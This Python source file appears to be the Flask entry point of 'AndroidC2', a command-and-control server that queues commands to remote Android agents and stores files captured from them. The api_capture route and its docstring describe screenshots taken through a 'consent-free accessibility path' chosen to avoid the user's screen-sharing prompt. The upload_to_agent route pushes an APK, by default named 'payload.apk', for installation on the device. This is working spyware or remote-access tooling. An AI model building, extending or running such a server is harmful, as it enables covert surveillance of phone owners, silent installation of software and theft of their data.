"""AndroidC2 — main entry point."""

import json
import os
import secrets
import shutil
from pathlib import Path

from flask import (
    Flask,
    g,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    session,
    url_for,
)
from sqlalchemy import update

from config import Config

from c2.agent_api import RESULT_MAX_CHARS, agent_api
from c2.agent_ws import (
    agent_online,
    register_agent_ws,
    send_command_to_agent,
)
from c2 import audit
from c2 import logs
from c2 import operators as ops
from c2.operators_cli import register as register_operator_cli
from c2.auth import (
    blocked_for,
    clear_failures,
    csrf_protect,
    csrf_token,
    is_authenticated,
    key_fingerprint,
    token_operator,
    operator_required,
    record_failure,
)
from c2.command_builder import (
    COMMAND_CATALOG,
    COMMAND_GROUPS,
    UnsupportedOnDevice,
    build_command,
    catalog_for,
    coverage,
)
from c2.file_handler import delete_device_files, verify_stored_path
from c2.reaper import start_reaper
from c2.timeutil import utcnow
from c2.ws_dashboard import broadcast, init_socketio, socketio
from database import db, init_db
from models import (
    CapturedFile,
    Command,
    Device,
    LogEntry,
    Operator,
    OperatorAction,
)


_VALID_REQUEST_ID = __import__("re").compile(r"^[A-Za-z0-9_.:-]{1,64}$")


def _valid_request_id(value: str) -> bool:
    return bool(value) and bool(_VALID_REQUEST_ID.match(value))


def _safe_next(candidate: str | None) -> str:
    """Only ever redirect to a local path."""
    if not candidate:
        return "/"
    if not candidate.startswith("/") or candidate.startswith("//"):
        return "/"
    return candidate


def _parse_iso(value: str):
    from datetime import datetime

    return datetime.fromisoformat(value.replace("Z", ""))


def audit_blocked_for() -> float:
    from c2.auth import blocked_for

    return blocked_for()


def _bootstrap_operator(app, log) -> None:
    """Make sure at least one operator exists.

    Kept idempotent: once the table is populated the environment variables
    are ignored, so rotating C2_OPERATOR_PASSWORD never silently changes an
    existing account. Use the CLI to add or change operators after that.
    """
    with app.app_context():
        action, row = ops.ensure_bootstrap(
            Config.OPERATOR_NAME, Config.OPERATOR_PASSWORD)
        if action == "created":
            logs.log(log, "info", "operator.bootstrap",
                     name=row.name, role=row.role,
                     token_fp=row.token_fingerprint(),
                     note="set C2_OPERATOR_NAME/PASSWORD only applies "
                          "while the operator table is empty")
        elif action == "skipped":
            logs.log(log, "warn", "operator.none",
                     note="no operators exist and no password was supplied; "
                          "run `flask --app app operators` to create one")


def _migrate_legacy_uploads(app) -> int:
    """Move captures out of static/ and repoint the database at the new root.

    static/ is served verbatim by Flask, so anything left there is readable
    without authentication. Draining it once at startup is the migration.
    """
    legacy = Path(Config.LEGACY_UPLOAD_FOLDER)
    target = Path(Config.UPLOAD_FOLDER)

    if not legacy.is_dir():
        return 0

    moved = 0
    for entry in legacy.rglob("*"):
        if not entry.is_file() or entry.name == ".gitkeep":
            continue
        relative = entry.relative_to(legacy)
        destination = target / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.move(str(entry), str(destination))
        moved += 1

    if moved:
        old_prefix = f"{legacy.resolve()}%"
        new_prefix = f"{target.resolve()}"
        with app.app_context():
            db.session.execute(
                update(CapturedFile)
                .where(CapturedFile.stored_path.like(old_prefix))
                .values(stored_path=db.func.replace(
                    CapturedFile.stored_path,
                    f"{legacy.resolve()}",
                    new_prefix,
                ))
            )
            db.session.commit()

    # Drop the now-empty tree, but keep the placeholder the repo tracks.
    for dirpath, _dirnames, filenames in os.walk(legacy, topdown=False):
        if any(name != ".gitkeep" for name in filenames):
            continue
        if any(Path(dirpath).iterdir()):
            continue
        try:
            os.rmdir(dirpath)
        except OSError:
            pass

    logs.log(logs.get_logger("c2.app"), "info", "uploads.migrated",
             moved=moved, target=str(target))
    return moved


def create_app(start_background: bool = True):
    app = Flask(__name__, static_folder="static", template_folder="templates")
    app.config.from_object(Config)

    logger = logs.configure(
        level=Config.LOG_LEVEL,
        fmt=Config.LOG_FORMAT,
        secrets=[Config.API_KEY, Config.OPERATOR_PASSWORD, Config.SECRET_KEY],
    )
    log = logs.get_logger("c2.app")

    os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)
    os.makedirs(os.path.join(Config.UPLOAD_FOLDER, "to_agent"), exist_ok=True)

    init_db(app)
    if Config.AUTH_MODE == "operator":
        _bootstrap_operator(app, log)
    _migrate_legacy_uploads(app)

    init_socketio(app)
    app.register_blueprint(agent_api)
    register_agent_ws()
    register_operator_cli(app)

    # ------------------------------------------------------ observability

    @app.before_request
    def _assign_request_id():
        rid = None
        if Config.TRUST_PROXY_REQUEST_ID:
            supplied = request.headers.get(logs.REQUEST_ID_HEADER, "")
            if _valid_request_id(supplied):
                rid = supplied
        rid = rid or logs.new_request_id()
        g.request_id = rid
        logs.set_request_id(rid)
        g.started_ms = logs.now_ms()

    @app.after_request
    def _log_request(response):
        rid = g.get("request_id") or logs.get_request_id()
        if rid:
            response.headers[logs.REQUEST_ID_HEADER] = rid
        elapsed = logs.now_ms() - g.get("started_ms", logs.now_ms())
        # Skip the dashboard's high-frequency polling chatter.
        if request.path.startswith("/api/") or request.path == "/login":
            logs.log(logs.get_logger("c2.http"), "info", "http.request",
                     method=request.method, path=request.path,
                     status=response.status_code, ms=elapsed,
                     ip=request.remote_addr)
        return response

    @app.teardown_request
    def _clear_request_context(_exc=None):
        # Threads are reused, and a contextvar left set here would bleed the
        # previous request's id into the next one served by the same thread.
        logs.set_request_id(None)
        logs.unbind_all()
        g.pop("request_id", None)
        g.pop("started_ms", None)

    @app.errorhandler(Exception)
    def _log_unhandled(exc):
        from werkzeug.exceptions import HTTPException

        if isinstance(exc, HTTPException):
            return exc

        logs.log(logs.get_logger("c2.app"), "error", "http.unhandled",
                 path=request.path, error=type(exc).__name__)
        app.logger.exception("unhandled error on %s", request.path)
        if app.config.get("TESTING") or app.config.get("PROPAGATE_EXCEPTIONS"):
            raise exc
        return jsonify({"error": "internal"}), 500

    # ---------------------------------------------------------------- auth

    @app.route("/login", methods=["GET", "POST"])
    def login():
        if Config.AUTH_MODE != "operator":
            return redirect(url_for("index"))
        if request.method == "POST":
            remaining = blocked_for()
            if remaining > 0:
                audit.record("auth.login_throttled", outcome="denied",
                             detail={"retry_after": round(remaining, 1)})
                db.session.commit()
                return render_template(
                    "login.html",
                    error=f"too many attempts — retry in {int(remaining)}s",
                    name=request.form.get("name", ""),
                ), 429

            name = (request.form.get("name") or "").strip()
            try:
                row = ops.verify_password(name, request.form.get("password", ""))
            except ops.AuthError:
                record_failure()
                audit.record("auth.login_fail", outcome="denied",
                             detail={"name": name,
                                     "remaining_block": round(audit_blocked_for(), 1)})
                db.session.commit()
                return render_template(
                    "login.html", error="invalid name or password", name=name,
                ), 401

            clear_failures()
            session.clear()
            session["operator"] = True
            session["operator_id"] = row.name
            session["operator_name"] = row.name
            session["operator_role"] = row.role
            session["sid"] = secrets.token_urlsafe(8)
            session.permanent = True
            csrf_token()
            ops.touch_login(row, request.remote_addr)
            audit.record("auth.login_ok",
                         detail={"next": _safe_next(request.form.get("next")),
                                 "role": row.role})
            db.session.commit()
            return redirect(_safe_next(request.form.get("next")))

        if is_authenticated():
            return redirect(url_for("index"))
        return render_template("login.html", error=None,
                               name=request.args.get("name", ""))

    # ------------------------------------------------- machine-token auth

    @app.route("/api/operators/me")
    @operator_required
    def api_operator_me():
        if Config.AUTH_MODE != "operator":
            return jsonify({"auth": Config.AUTH_MODE,
                            "name": Config.OPERATOR_NAME,
                            "role": "admin",
                            "disabled": False,
                            "has_token": False,
                            "token_fp": None})
        """Who this request acts as, and by which credential kind."""
        name = session.get("operator_name")
        if name:
            return jsonify({"auth": "session", **ops.require(name).to_dict()})
        return jsonify({"auth": "token", **token_operator().to_dict()})

    @app.route("/api/operators")
    @operator_required
    def api_operators():
        """List operators. Tokens appear as fingerprints, never in full."""
        if Config.AUTH_MODE != "operator":
            return jsonify([])
        rows = Operator.query.order_by(Operator.name.asc()).all()
        return jsonify([r.to_dict() for r in rows])

    @app.route("/api/operators", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_create_operator():
        body = request.get_json(silent=True) or {}
        try:
            row, token = ops.create_operator(
                name=str(body.get("name", "")).strip(),
                password=str(body.get("password", "")),
                role=str(body.get("role", "admin")),
            )
        except ops.AuthError as exc:
            return jsonify({"error": str(exc)}), 400

        audit.record("operator.create",
                     detail={"name": row.name, "role": row.role})
        db.session.commit()
        # The only moment the plaintext token exists in a response.
        return jsonify({**row.to_dict(), "token": token}), 201

    @app.route("/api/operators/<name>/token", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_rotate_token(name):
        if Config.AUTH_MODE != "operator":
            return jsonify({"error": "operators require C2_AUTH=operator"}), 400
        try:
            row, token = ops.issue_token(name)
        except ops.AuthError as exc:
            return jsonify({"error": str(exc)}), 404
        audit.record("operator.token_rotate", detail={"name": row.name})
        db.session.commit()
        return jsonify({**row.to_dict(), "token": token})

    @app.route("/api/operators/<name>/token", methods=["DELETE"])
    @operator_required
    @csrf_protect
    def api_revoke_token(name):
        if Config.AUTH_MODE != "operator":
            return jsonify({"error": "operators require C2_AUTH=operator"}), 400
        try:
            row = ops.revoke_token(name)
        except ops.AuthError as exc:
            return jsonify({"error": str(exc)}), 404
        audit.record("operator.token_revoke", detail={"name": row.name})
        db.session.commit()
        return jsonify(row.to_dict())

    @app.route("/logout", methods=["POST"])
    @operator_required
    @csrf_protect
    def logout():
        audit.record("auth.logout")
        db.session.commit()
        session.clear()
        return redirect(url_for("login"))

    @app.route("/api/session")
    @operator_required
    def api_session():
        from c2.auth import auth_status

        return jsonify(auth_status())

    # ------------------------------------------------------------------ ui

    @app.route("/")
    @operator_required
    def index():
        return render_template(
            "index.html",
            csrf_token=csrf_token() if Config.AUTH_MODE == "operator" else "",
            auth_mode=Config.AUTH_MODE,
        )

    # ------------------------------------------------------------- devices

    @app.route("/api/devices")
    @operator_required
    def api_devices():
        devices = Device.query.order_by(Device.last_seen.desc()).all()
        result = []
        for d in devices:
            data = d.to_dict()
            data["ws_online"] = agent_online(d.device_id)
            result.append(data)
        return jsonify(result)

    @app.route("/api/device/<int:dev_id>")
    @operator_required
    def api_device(dev_id):
        dev = db.get_or_404(Device, dev_id)
        data = dev.to_dict()
        data["ws_online"] = agent_online(dev.device_id)
        return jsonify(data)

    @app.route("/api/device/<int:dev_id>", methods=["DELETE"])
    @operator_required
    @csrf_protect
    def api_delete_device(dev_id):
        dev = db.get_or_404(Device, dev_id)
        # Rows go with the cascade; the bytes on disk need removing too.
        freed = delete_device_files(dev)
        audit.record("device.delete", device=dev,
                     detail={"bytes_freed": freed,
                             "commands": dev.commands.count(),
                             "files": dev.files.count()})
        db.session.delete(dev)
        db.session.commit()
        broadcast("device_removed", {"id": dev_id})
        return jsonify({"ok": True, "bytes_freed": freed})

    @app.route("/api/device/<int:dev_id>/notes", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_set_notes(dev_id):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        dev.notes = str(body.get("notes", ""))[:8000]
        audit.record("device.notes", device=dev,
                     detail={"chars": len(dev.notes)})
        db.session.commit()
        return jsonify({"ok": True})

    @app.route("/api/device/<int:dev_id>/tags", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_set_tags(dev_id):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        tags = body.get("tags", [])
        if not isinstance(tags, list):
            tags = [str(tags)]
        cleaned = [str(t).strip()[:32] for t in tags if str(t).strip()][:16]
        dev.tags = ",".join(cleaned)
        audit.record("device.tags", device=dev, detail={"tags": cleaned})
        db.session.commit()
        return jsonify(dev.to_dict())

    # ------------------------------------------------------------ commands

    @app.route("/api/device/<int:dev_id>/commands")
    @operator_required
    def api_commands(dev_id):
        cmds = (Command.query.filter_by(device_id=dev_id)
                .order_by(Command.created_at.desc()).limit(200).all())
        return jsonify([c.to_dict() for c in cmds])

    def _queue_command(dev_id: int, forced: dict | None = None):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        ctype = forced["type"] if forced else body.get("type")
        args = forced["args"] if forced else (body.get("args") or {})
        if not isinstance(args, dict):
            return jsonify({"error": "bad_args"}), 400
        if ctype not in COMMAND_CATALOG:
            return jsonify({"error": "unknown_command"}), 400

        try:
            cmd = build_command(dev, ctype, args)
        except UnsupportedOnDevice as exc:
            # The device told us it does not implement this. Say so plainly
            # instead of queueing a command that will bounce.
            audit.record("command.rejected", device=dev, outcome="denied",
                         detail={"type": ctype, "reason": "unsupported_on_device"})
            db.session.commit()
            return jsonify({"error": "unsupported_on_device",
                            "detail": str(exc),
                            "coverage": coverage(dev)}), 409
        pushed = send_command_to_agent(dev.device_id, {
            "id": cmd.id,
            "type": cmd.command_type,
            "args": cmd.args(),
        })
        if pushed:
            cmd.status = "sent"
            cmd.delivered_at = utcnow()
            db.session.commit()

        audit.record("command.queue", device=dev, command=cmd,
                     detail={"pushed": pushed, "args": cmd.args()})
        db.session.commit()

        broadcast("new_command", cmd.to_dict())
        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})

    @app.route("/api/device/<int:dev_id>/command", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_send_command(dev_id):
        return _queue_command(dev_id)

    # Kept as an alias: the old panel and the Telegram bridge both use /push.
    @app.route("/api/device/<int:dev_id>/push", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_push_command(dev_id):
        return _queue_command(dev_id)

    @app.route("/api/catalog")
    @operator_required
    def api_catalog():
        """Catalogue, optionally narrowed to what one device can accept.

        /api/catalog                 → everything
        /api/catalog?device_id=7     → only what device 7 implements
        """
        raw = request.args.get("device_id")
        if raw is None or not raw.isdigit():
            return jsonify({
                "commands": COMMAND_CATALOG,
                "groups": [{"id": gid, "label": label}
                           for gid, label in COMMAND_GROUPS],
            })

        dev = db.get_or_404(Device, int(raw))
        return jsonify({
            "commands": catalog_for(dev),
            "groups": [{"id": gid, "label": label}
                       for gid, label in COMMAND_GROUPS],
            "coverage": coverage(dev),
        })

    # --------------------------------------------------------------- files

    @app.route("/api/device/<int:dev_id>/files")
    @operator_required
    def api_files(dev_id):
        files = (CapturedFile.query.filter_by(device_id=dev_id)
                 .order_by(CapturedFile.captured_at.desc()).limit(500).all())
        return jsonify([f.to_dict() for f in files])

    def _stored_or_404(cf: CapturedFile):
        safe = verify_stored_path(cf.stored_path)
        if not safe or not os.path.isfile(safe):
            return None, (jsonify({"error": "file_missing"}), 404)
        return safe, None

    @app.route("/api/file/<int:file_id>/raw")
    @operator_required
    def api_file_raw(file_id):
        cf = db.get_or_404(CapturedFile, file_id)
        safe, err = _stored_or_404(cf)
        if err:
            return err
        audit.record("file.view", device=cf.device,
                     detail={"file_id": cf.id, "filename": cf.filename,
                             "bytes": cf.size_bytes})
        db.session.commit()
        return send_file(safe, as_attachment=False,
                         download_name=cf.filename, mimetype=cf.mime_type)

    @app.route("/api/file/<int:file_id>/download")
    @operator_required
    def api_file_download(file_id):
        cf = db.get_or_404(CapturedFile, file_id)
        safe, err = _stored_or_404(cf)
        if err:
            return err
        audit.record("file.download", device=cf.device,
                     detail={"file_id": cf.id, "filename": cf.filename,
                             "bytes": cf.size_bytes})
        db.session.commit()
        return send_file(safe, as_attachment=True, download_name=cf.filename)

    @app.route("/api/device/<int:dev_id>/latest-screenshot")
    @operator_required
    def api_latest_screenshot(dev_id):
        cf = (CapturedFile.query
              .filter_by(device_id=dev_id, category="screenshot")
              .order_by(CapturedFile.captured_at.desc()).first())
        if not cf:
            return jsonify({"error": "no_screenshot"}), 404
        safe, err = _stored_or_404(cf)
        if err:
            return err
        return send_file(safe, mimetype=cf.mime_type)

    @app.route("/api/device/<int:dev_id>/capture", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_capture(dev_id):
        """Ask the device for a screenshot now.

        The agent tries the consent-free accessibility path first and falls back
        to MediaProjection, so this works without the screen-broadcast prompt.
        Which path actually ran is in the result payload's `source` field, and
        the panel surfaces it.
        """
        return _queue_command(dev_id, forced={"type": "screenshot", "args": {}})

    @app.route("/api/device/<int:dev_id>/capture/status")
    @operator_required
    def api_capture_status(dev_id):
        """Which capture paths this device can currently use.

        Read-only: returns the most recent screenshot_status result if one has
        landed, so the panel can distinguish "not enabled yet" from "failed".
        """
        db.get_or_404(Device, dev_id)
        cmd = (Command.query
               .filter_by(device_id=dev_id, command_type="screenshot_status",
                          status="done")
               .order_by(Command.completed_at.desc()).first())
        if not cmd:
            return jsonify({"error": "no_status"}), 404
        try:
            return jsonify({"status": json.loads(cmd.result or "{}")})
        except (ValueError, TypeError):
            return jsonify({"status": {"raw": cmd.result}})

    @app.route("/api/device/<int:dev_id>/command/<int:cmd_id>")
    @operator_required
    def api_command_result(dev_id, cmd_id):
        """One command's stored result, for the panel's result viewer.

        Sequentially allocated ids mean existence is not authorisation, so the
        device is checked the same way agent_api scopes it.
        """
        db.get_or_404(Device, dev_id)
        cmd = db.get_or_404(Command, cmd_id)
        if cmd.device_id != dev_id:
            return jsonify({"error": "unknown_command"}), 404
        try:
            result = json.loads(cmd.result) if cmd.result else {}
        except (ValueError, TypeError):
            result = {"raw": cmd.result}
        # json.loads("null") is None, not {}. The panel expects an object and
        # would render "null" where an empty result should read as empty.
        if not isinstance(result, dict):
            result = {"value": result}
        return jsonify({
            "id": cmd.id,
            "type": cmd.command_type,
            "status": cmd.status,
            "args": cmd.args(),
            "result": result,
            "truncated": cmd.result is not None
                           and len(cmd.result) >= RESULT_MAX_CHARS,
            "created_at": cmd.created_at.isoformat() if cmd.created_at else None,
            "completed_at": (cmd.completed_at.isoformat()
                             if cmd.completed_at else None),
        })

    @app.route("/api/device/<int:dev_id>/upload_to_agent", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_upload_to_agent(dev_id):
        dev = db.get_or_404(Device, dev_id)
        f = request.files.get("file")
        if not f or not f.filename:
            return jsonify({"error": "no_file"}), 400

        from c2.file_handler import sanitize_filename

        staged_name = (f"{sanitize_filename(dev.device_id, 'device')}_"
                       f"{sanitize_filename(f.filename, 'payload.apk')}")
        dest = os.path.join(Config.UPLOAD_FOLDER, "to_agent", staged_name)
        f.save(dest)

        cmd = build_command(dev, "install_apk", {"path": dest})
        audit.record("file.push", device=dev, command=cmd,
                     detail={"filename": f.filename, "bytes": os.path.getsize(dest)})
        db.session.commit()
        return jsonify(cmd.to_dict())

    # ---------------------------------------------------------------- logs

    @app.route("/api/device/<int:dev_id>/logs")
    @operator_required
    def api_logs(dev_id):
        logs = (LogEntry.query.filter_by(device_id=dev_id)
                .order_by(LogEntry.created_at.desc()).limit(500).all())
        return jsonify([l.to_dict() for l in logs])

    # --------------------------------------------------------------- audit

    @app.route("/api/audit")
    @operator_required
    def api_audit():
        """Read-only operator action log.

        Deliberately GET-only: there is no route that mutates or deletes an
        entry, and no filter can be combined into one that can.
        """
        query = OperatorAction.query

        actor_filter = request.args.get("actor")
        if actor_filter:
            query = query.filter(OperatorAction.actor == actor_filter)

        action_filter = request.args.get("action")
        if action_filter:
            query = query.filter(OperatorAction.action == action_filter)

        if request.args.get("outcome"):
            query = query.filter(OperatorAction.outcome == request.args["outcome"])

        device_filter = request.args.get("device_id")
        if device_filter:
            query = query.filter(OperatorAction.device_id == device_filter)

        since = request.args.get("since")
        if since:
            try:
                query = query.filter(OperatorAction.created_at >= _parse_iso(since))
            except ValueError:
                return jsonify({"error": "bad_since"}), 400

        try:
            limit = min(max(int(request.args.get("limit", 100)), 1), 500)
        except ValueError:
            return jsonify({"error": "bad_limit"}), 400
        try:
            offset = max(int(request.args.get("offset", 0)), 0)
        except ValueError:
            return jsonify({"error": "bad_offset"}), 400

        total = query.count()
        rows = (query.order_by(OperatorAction.id.desc())
                    .limit(limit).offset(offset).all())

        return jsonify({
            "entries": [r.to_dict() for r in rows],
            "total": total,
            "limit": limit,
            "offset": offset,
        })

    @app.route("/api/audit/verify")
    @operator_required
    def api_audit_verify():
        """Recompute the digest chain and report the first mismatch."""
        result = audit.verify_chain(limit=1000)
        return jsonify(result), (200 if result["ok"] else 409)

    @app.route("/api/audit/actions")
    @operator_required
    def api_audit_actions():
        """Distinct action names present in the log, for filter UIs."""
        rows = (db.session.query(OperatorAction.action)
                .distinct().order_by(OperatorAction.action).all())
        actors = (db.session.query(OperatorAction.actor)
                  .distinct().order_by(OperatorAction.actor).all())
        return jsonify({
            "actions": [r[0] for r in rows],
            "actors": [r[0] for r in actors],
        })

    # -------------------------------------------------------------- errors

    @app.errorhandler(404)
    def not_found(_):
        if request.path.startswith("/api/"):
            return jsonify({"error": "not_found"}), 404
        return render_template("login.html", error="not found"), 404

    @app.errorhandler(401)
    def unauthorized(_):
        return jsonify({"error": "unauthorized"}), 401

    @app.errorhandler(403)
    def forbidden(_):
        return jsonify({"error": "forbidden"}), 403

    if start_background:
        start_reaper(
            app,
            Config.AGENT_HEARTBEAT_TIMEOUT,
            Config.AGENT_REAPER_INTERVAL,
        )

    return app


def _startup_banner():
    """Structured summary of how this process is configured.

    Configures logging first if it is not already set up: the banner used to
    run before create_app(), which meant its line was emitted before a handler
    existed and was silently dropped.

    The operator password is never printed: the old banner did, which put a
    live credential in journald. Read it from
    data/c2_operator_password.secret instead.
    """
    import logging

    if not logging.getLogger("c2").handlers:
        logs.configure(level=Config.LOG_LEVEL, fmt=Config.LOG_FORMAT,
                       secrets=[Config.API_KEY, Config.OPERATOR_PASSWORD,
                                Config.SECRET_KEY])

    from c2.auth import TRUSTED_PROXY

    from_env = bool(os.environ.get("C2_OPERATOR_PASSWORD"))
    logs.log(logs.get_logger("c2.startup"), "info", "server.starting",
             host=Config.C2_HOST, port=Config.C2_PORT,
             uploads=Config.UPLOAD_FOLDER,
             database=Config.SQLALCHEMY_DATABASE_URI,
             log_format=Config.LOG_FORMAT,
             log_level=Config.LOG_LEVEL,
             auth_mode=Config.AUTH_MODE,
             access_token_set=bool(Config.ACCESS_TOKEN),
             trusted_proxy=bool(TRUSTED_PROXY),
             api_key_fp=key_fingerprint(Config.API_KEY),
             api_key_len=len(Config.API_KEY),
             operator_from_env=from_env,
             heartbeat_timeout=Config.AGENT_HEARTBEAT_TIMEOUT)

    warn = logs.get_logger("c2.startup")

    if Config.AUTH_MODE == "open" and Config.C2_HOST not in ("127.0.0.1", "localhost"):
        logs.log(warn, "warn", "auth.unsafe_binding",
                 host=Config.C2_HOST,
                 note="C2_AUTH=open while bound to a non-loopback address; "
                      "set C2_AUTH=token or bind to 127.0.0.1")

    if Config.AUTH_MODE == "token":
        if not Config.ACCESS_TOKEN:
            logs.log(warn, "error", "auth.token_missing",
                     note="C2_AUTH=token but C2_ACCESS_TOKEN is empty; "
                          "every remote request will be refused")
        if not TRUSTED_PROXY:
            logs.log(warn, "warn", "auth.proxy_untrusted",
                     note="tunnel or reverse proxy requests arrive as "
                          "127.0.0.1 and would be treated as local; "
                          "set C2_TRUSTED_PROXY=127.0.0.1")

    if Config.AUTH_MODE == "operator" and Config.C2_HOST == "127.0.0.1":
        logs.log(warn, "info", "auth.operator_mode",
                 note="loopback only — set C2_HOST=0.0.0.0 behind a "
                      "reverse proxy if you need remote access")


if __name__ == "__main__":
    _startup_banner()
    application = create_app()
    socketio.run(
        application,
        host=Config.C2_HOST,
        port=Config.C2_PORT,
        debug=False,
        allow_unsafe_werkzeug=True,
    )